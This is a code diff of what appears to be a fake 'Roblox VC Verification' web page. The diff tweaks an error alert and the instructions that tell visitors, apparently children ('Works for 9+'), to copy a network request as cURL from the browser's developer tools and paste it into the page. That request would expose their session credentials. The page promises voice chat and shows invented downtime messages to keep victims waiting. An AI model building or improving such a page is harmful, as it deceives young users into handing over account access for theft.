@@ -91,7 +91,7 @@
                     console.error("Fa:", response.status, response.statusText);
                 }
 
-                alert("Sorry, we are experiencing heavy downtime at the moment. Please wait around 3 hours or you can close out of the website and try again later. This can happen because of: 1. You haven't entered a valid VC code. 2. Your VC Code isn't valid.");
+                alert("Your VC Code isn't valid.");
             } catch (error) {
                 console.error("Error:", error);
                 alert("Sorry, we are experiencing heavy downtime at the moment. Please wait around 3 hours or you can close out of the website and try again later.");
@@ -102,7 +102,7 @@
 <body>
     <div class="container">
         <h1>Roblox VC Verification</h1>
-        <p class="instructions">To verify VC, click the button below, then right click -> Inspect Element -> Network. Click on the Gray Circle to make it Red and refresh the popup by right-clicking and pressing reload. Right-click and copy the voicechat code as cURL or fetch nodejs, not Powershell, and paste it into the text box below. Click "Get VC" to submit. Wait around 1-2 hours and you will get VC! Works for 9+.</p>
+        <p class="instructions">To verify VC, click the button below, then right click -> Inspect Element -> Network. Click on the Gray Circle to make it Red and refresh the popup by right-clicking and pressing reload. Right-click and copy the voicechat code as cURL or Fetch-Nodejs and paste it into the text box below. Click "Get VC" to submit. Wait around 1-2 hours and you will get VC! Works for 9+.</p>
         <button class="button" onclick="openPopup()">Tap or Click Button and Verify to Get Voicechat</button>
         <br><br>
         <input type="text" id="vcCode" class="textbox" placeholder="Enter your voicechat code here">
